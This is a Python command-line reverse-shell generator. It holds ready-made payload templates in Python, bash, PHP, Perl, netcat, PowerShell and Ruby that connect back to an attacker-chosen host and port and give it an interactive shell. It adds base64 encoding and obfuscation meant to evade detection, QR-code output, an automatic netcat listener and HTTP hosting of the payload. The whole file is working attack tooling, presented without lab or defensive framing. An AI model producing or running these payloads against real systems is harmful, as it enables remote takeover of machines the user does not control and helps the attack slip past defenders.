import argparse
import base64
import json
import pyperclip
import socket
import subprocess
import qrcode
import os

# a dictionary of shell payloads in different languages, each value being an f-string template to fill in parameters like host and port and optionally shell
REVERSE_SHELLS = {
    "python": 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));'
              'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
              'import pty;pty.spawn("{shell}")',
    "bash": 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    "php": 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "perl": 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            'exec("{shell} -i");}};\'',
    "nc": 'nc -e {shell} {host} {port}',
    "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
                  '"$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});'
                  '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
                  'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
                  '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                  '$sendback = (iex $data 2>&1 | Out-String );'
                  '$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';'
                  '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
                  '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"',
    "ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;'
            'exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)\'',
}

# simple function to validate if the ip given is an ipv4 address
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# simple obfuscation function designed to hide the code, make it less detectable depending on the language;; can add more if needed
def obfuscate_payload(payload, lang):
    if lang == "powershell":
        return ''.join([f"`{char}" for char in payload])
    elif lang == "python":
        hex_payload = ''.join(f"\\x{ord(c):02x}" for c in payload)
        return f'python3 -c "exec(\'{hex_payload}\'.encode().decode(\'unicode_escape\'))"'
    return payload

# function to create the reverse shell command based on user input;; certain parameters can be expanded upon depending on the previous function
def generate_payload(host, port, lang="python", shell="/bin/bash", encode_base64=False, obfuscate=False):
    if lang not in REVERSE_SHELLS:
        raise ValueError(f"Unsupported language: {lang}")
    payload = REVERSE_SHELLS[lang].format(host=host, port=port, shell=shell)
    raw_payload = payload
    if encode_base64 and lang == "python":
        b64 = base64.b64encode(payload.encode()).decode()
        payload = f'python3 -c "import base64;exec(base64.b64decode(\'{b64}\'))"'
    if obfuscate:
        payload = obfuscate_payload(payload, lang)
    return payload, raw_payload

# experimental qr code function, to convert payload into a scannable qr code 
def generate_qr_code(payload, filename="payload_qr.png"):
    qr = qrcode.QRCode()
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill="black", back_color="white")
    img.save(filename)
    print(f"|+| QR code saved as {filename}")

# function that provides user a convenient path to set up the listener
def start_listener(port):
    try:
        subprocess.Popen(["nc", "-lvnp", str(port)])
        print(f"|+| Netcat listener started on port {port}")
    except Exception as e:
        print(f"|!| Failed to start listener: {e}")

# function that allows user to send payload over http
def serve_payload(payload, port=8000):
    filename = "payload.sh"
    with open(filename, "w") as f:
        f.write(payload)
    os.system(f"python3 -m http.server {port} &")
    print(f"|+| Payload hosted at http://localhost:{port}/{filename}")

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Multi-language Reverse Shell Generator")
    parser.add_argument("host", help="Attacker IP for callback (LHOST)")
    parser.add_argument("port", type=int, help="Port for callback (LPORT)")
    parser.add_argument("-l", "--lang", default="python", help="Language (python, bash, php, perl, nc, powershell, ruby)")
    parser.add_argument("-s", "--shell", default="/bin/bash", help="Shell to spawn (default: /bin/bash)")
    parser.add_argument("-b", "--base64", action="store_true", help="Base64-encode Python payload")
    parser.add_argument("-o", "--output", help="File to save payload")
    parser.add_argument("-j", "--json", action="store_true", help="Output payload in JSON format")
    parser.add_argument("-c", "--clipboard", action="store_true", help="Copy payload to clipboard")
    parser.add_argument("--obfuscate", action="store_true", help="Obfuscate payload (Python/PowerShell only)")
    parser.add_argument("--qr", action="store_true", help="Generate QR code of payload")
    parser.add_argument("--listener", action="store_true", help="Start Netcat listener")
    parser.add_argument("--host-payload", action="store_true", help="Host payload over HTTP")
    args = parser.parse_args()

    if not validate_ip(args.host):
        print("|x| Invalid IP address.")
        return

    try:
        payload, raw = generate_payload(args.host, args.port, args.lang, args.shell, args.base64, args.obfuscate)
    except ValueError as ve:
        print(f"|x| Error: {ve}")
        return

    if args.output:
        with open(args.output, "w") as f:
            f.write(payload)
        print(f"|+| Payload saved to {args.output}")

    if args.clipboard:
        pyperclip.copy(payload)
        print("|+| Payload copied to clipboard.")

    if args.json:
        print(json.dumps({
            "language": args.lang,
            "host": args.host,
            "port": args.port,
            "shell": args.shell,
            "payload": payload
        }, indent=2))
    else:
        print("\n$_$-$_$-$_$ Reverse Shell Payload $_$-$_$-$_$ \n")
        print(payload)
        print("\n$_$-$_$-$_$-$_$-$_$-$___$-$_$-$_$-$_$-$_$-$_$   \n")
        print(f"Start a listener with: nc -lvnp {args.port}")

    if args.qr:
        generate_qr_code(payload)

    if args.listener:
        start_listener(args.port)

    if args.host_payload:
        serve_payload(payload)

if __name__ == "__main__":
    cli()
